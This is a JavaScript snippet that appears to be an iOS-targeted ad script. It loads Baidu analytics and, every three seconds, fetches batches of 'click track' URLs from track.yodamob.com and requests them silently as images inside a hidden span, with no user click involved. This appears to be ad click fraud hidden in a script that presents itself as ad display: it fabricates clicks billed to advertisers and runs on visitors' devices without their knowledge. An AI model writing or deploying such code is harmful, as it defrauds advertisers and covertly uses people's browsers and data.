    var yodaEnv = getJsParas();

    yodaEnv.bdtoken = '23036220995540481788d9c0094def31';
    //plat= ios android all

    var u = navigator.userAgent;
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

    if (yodaEnv.plat == 'ios') {
        if (isiOS) {
            showAD();
        }
    } else if (yodaEnv.plat == 'all') {
        showAD();
    }

    function getJsParas() {

        var scripts = document.getElementsByTagName('script');
        var src = scripts[scripts.length - 1].src;

        var arg = src.indexOf('?') !== -1 ? src.split('?').pop() : '';
        var yodaEnv = {};
        arg.replace(/(\w+)(?:=([^&]*))?/g, function(a, key, value) {
            yodaEnv[key] = value;
        });

        return yodaEnv;

    }

    function sendClickTrack(sendUrls) {

        if (sendUrls.length == 0) {
            return;
        }

        var hiddenSpan = document.createElement('span');
        hiddenSpan.style.display = 'none';

        for (var i = 0; i < sendUrls.length; i++) {
            var img = document.createElement('img');
            img.src = sendUrls[i];
            hiddenSpan.appendChild(img);
        }

    }


    function showAD() {

        var yodaslotid = yodaEnv.slotid;

        if (!(yodaEnv && yodaslotid)) {
            return
        }

        //baidu static
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?" + yodaEnv.bdtoken;
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();

        // 1.pv data
        // 2.request data
        // 3.request success data
        // 4.click data

        _hmt.push(['_trackEvent', yodaslotid, 'pv'])

        var urls = [];

        var split = 0;
        var sliceNum = 5;

        var sendTrack = function() {

            console.log("fasgsag!")
            if (urls.length == 0) {

                var xhr = new XMLHttpRequest();
                _hmt.push(['_trackEvent', yodaslotid, 'req'])
                xhr.open('GET', 'https://track.yodamob.com/st/v1/ruo?os=ios&num=100&slotid=' + yodaslotid);
                xhr.send();
                xhr.onreadystatechange = function() {

                    if (xhr.readyState == 4 && xhr.status == 200) {

                        _hmt.push(['_trackEvent', yodaslotid, 'req_suc'])

                        urls = JSON.parse(xhr.responseText);

                        //console.log(urls.length);

                        var start = split * sliceNum;
                        var end = (split + 1) * sliceNum;

                        var sendUrls = urls.slice(start, end);
                        //console.log(sendUrls);

                        sendClickTrack(sendUrls);

                        split++;
                    }
                };

            } else {

                var start = split * sliceNum;
                var end = (split + 1) * sliceNum;

                var sendUrls = urls.slice(start, end);
                //console.log(sendUrls);
                sendClickTrack(sendUrls);
                split++;
            }


        }

        //setTimeout(sendTrack, 3000);

        setInterval(sendTrack, 3000);

    }


